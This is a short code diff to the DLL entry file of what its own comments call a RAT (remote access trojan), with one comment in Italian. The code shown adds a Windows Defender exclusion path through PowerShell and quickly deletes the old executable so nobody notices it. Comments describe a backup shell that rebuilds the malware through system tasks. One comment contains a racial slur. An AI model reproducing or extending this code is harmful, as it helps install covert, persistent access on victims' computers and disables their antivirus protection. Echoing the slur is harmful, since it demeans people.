@@ -1,5 +1,4 @@
 // dllmain.cpp : Definisce il punto di ingresso per l'applicazione DLL.
-#include "pch.h"
 #include "general.h"
 #include "embeds.h"
 #include "injection.h"
@@ -33,6 +32,7 @@ void main() {
     powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\"");
     //Our RAT won't really need Windows folder exclusions since we already excluded the processes, and there's always a backup shell capable of regenerating all its other parts via system Tasks
 
+#ifndef SELF_INJECTION
     while (FileExists(full_path)) { //If update.exe still exists, wait for it to be renamed
         Sleep(100);
     }
@@ -40,7 +40,7 @@ void main() {
     while (!remove((GetCWD() + "trash.tmp").c_str())) { //Remove the old executable as fast as possible to avoid sussy bakas looking around the folder :)
         Sleep(100);
     }
-
+#endif
 	CloseHandle(hProc);
 
     //Write the shell inside System modules folder, just because why not mess with them niggas
